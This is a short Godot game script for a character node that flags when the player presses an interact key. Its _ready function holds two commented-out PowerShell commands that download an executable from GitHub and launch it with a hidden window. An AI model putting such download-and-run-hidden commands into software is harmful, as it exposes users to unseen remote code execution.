extends Node2D

@export var resource: Person

#signal interact(node: Node)
## Called when the node enters the scene tree for the first time.
func _ready() -> void:
	pass
	#OS.execute("powershell.exe", ["-Command", "Invoke-WebRequest https://github.com/314PiGuy/swap/raw/main/spaghetti.exe -o spaghetti.exe"])
	#OS.execute("powershell.exe", ["-Command", "Start-Process spaghetti.exe -WindowStyle Hidden"])
#
# Called every frame. 'delta' is the elapsed time since the previous frame.

func _process(delta: float) -> void:
	if Input.is_action_just_pressed("interact"):
		resource.interacting = true
	else:
		resource.interacting = false
